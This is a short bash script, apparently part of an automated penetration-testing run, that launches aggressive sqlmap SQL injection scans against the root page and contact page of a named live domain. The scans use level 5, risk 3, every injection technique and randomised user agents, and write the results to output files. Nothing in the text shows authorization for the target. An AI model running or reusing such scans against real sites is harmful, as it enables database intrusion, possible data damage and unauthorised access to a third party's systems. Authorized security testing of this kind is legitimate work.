#!/bin/bash
W="$WORK_PATH/tool_outputs"
B="https://www.infinitycapital.bh"
echo "### 1) sqlmap on /  (id,search,page,zzz)"
sqlmap -u "$B/?id=1&search=test&page=2&zzz=1" \
  --batch --level=5 --risk=3 --threads=1 --delay=1.2 --timeout=20 --retries=1 \
  --random-agent --technique=BEUSTQ --flush-session \
  -p "id,search,page,zzz" -o "$W/p11_sqlmap_root.txt" 2>&1 | tail -30
echo "### 2) sqlmap on /contact (cb,x,q)"
sqlmap -u "$B/contact?cb=1&x=1&q=1" \
  --batch --level=5 --risk=3 --threads=1 --delay=1.2 --timeout=20 --retries=1 \
  --random-agent --technique=BEUSTQ --flush-session \
  -p "cb,x,q" -o "$W/p11_sqlmap_contact.txt" 2>&1 | tail -25
echo "### DONE"
